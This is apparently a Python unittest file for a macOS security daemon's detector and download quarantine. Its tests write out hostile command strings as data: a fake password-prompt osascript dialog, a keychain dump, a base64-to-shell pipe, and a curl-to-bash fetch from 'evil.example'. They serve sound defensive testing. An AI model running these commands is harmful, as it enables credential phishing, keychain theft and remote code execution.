import os
import sys
import tempfile
import unittest
from unittest.mock import patch

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "jarvisd"))
import security  # noqa: E402


class OwnItemTest(unittest.TestCase):
    def test_own_menubar_is_exempt(self):
        prog = os.path.join(security.MEK_HOME, "mek-menubar")
        self.assertTrue(security.is_own_item("com.alptug.mek.ui", prog))

    def test_foreign_item_is_not_exempt(self):
        self.assertFalse(security.is_own_item("com.evil.x", "/tmp/x"))
        self.assertFalse(security.is_own_item("com.alptug.mek.ui", "/tmp/x"))

    def test_creative_plugin_dirs_are_protected_from_quarantine(self):
        for p in (
            "/Applications/Adobe Premiere Pro 2026/Adobe Premiere Pro 2026.app/Contents/MacOS/Adobe Premiere Pro 2026",
            "/Library/Application Support/Adobe/Common/Plug-ins/7.0/MediaCore/Universe.plugin",
            "/Library/OFX/Plugins/Dehancer.ofx.bundle",
            "/Library/Audio/Plug-Ins/VST3/FabFilter Pro-Q 3.vst3",
        ):
            self.assertTrue(p.startswith(security.PROTECTED), msg=f"Path should be protected: {p}")

    def test_stealer_and_shell_injection_detection(self):
        self.assertIsNotNone(security.inspect_script_text(
            'osascript -e \'display dialog "System Preferences requires your password" default answer "" with hidden answer\''
        ))
        self.assertIsNotNone(security.inspect_script_text("security dump-keychain -d login.keychain"))
        self.assertIsNotNone(security.inspect_script_text("echo aGVsbG8= | base64 -D | sh"))
        self.assertIsNotNone(security.inspect_script_text("curl -fsSL https://evil.example/p.sh | bash"))
        # Normal macOS bildirimleri stealer sayılmaz:
        self.assertIsNone(security.inspect_script_text('osascript -e \'display notification "Render bitti" with title "Mek"\''))
        self.assertIsNone(security.inspect_script_text("export PATH=/opt/homebrew/bin:$PATH"))

    def test_scan_recent_downloads_covers_both_downloads_and_desktop(self):
        with tempfile.TemporaryDirectory() as tmp:
            dl_dir = os.path.join(tmp, "Downloads")
            dt_dir = os.path.join(tmp, "Desktop")
            q_dir = os.path.join(tmp, "karantina")
            os.makedirs(dl_dir)
            os.makedirs(dt_dir)
            os.makedirs(q_dir)

            evil_desktop = os.path.join(dt_dir, "Patch_Install.command")
            with open(evil_desktop, "w", encoding="utf-8") as f:
                f.write('#!/bin/bash\nosascript -e \'display dialog "Password" default answer "" with hidden answer\'\n')

            clean_dl = os.path.join(dl_dir, "install_helper.sh")
            with open(clean_dl, "w", encoding="utf-8") as f:
                f.write("#!/bin/bash\necho 'Hello clean world'\n")

            sec = security.Security(lambda *a, **kw: None)
            with patch.object(security, "QUARANTINE", q_dir), \
                 patch.object(security, "DOWNLOAD_GATE_STATE", os.path.join(tmp, "dl_gate.json")):
                res = sec.scan_recent_downloads(target_dirs=[dl_dir, dt_dir])
                self.assertEqual(res["checked"], 2)
                self.assertIn("Patch_Install.command", res["quarantined"])
                self.assertFalse(os.path.exists(evil_desktop))
                self.assertTrue(os.path.exists(clean_dl))


if __name__ == "__main__":
    unittest.main()
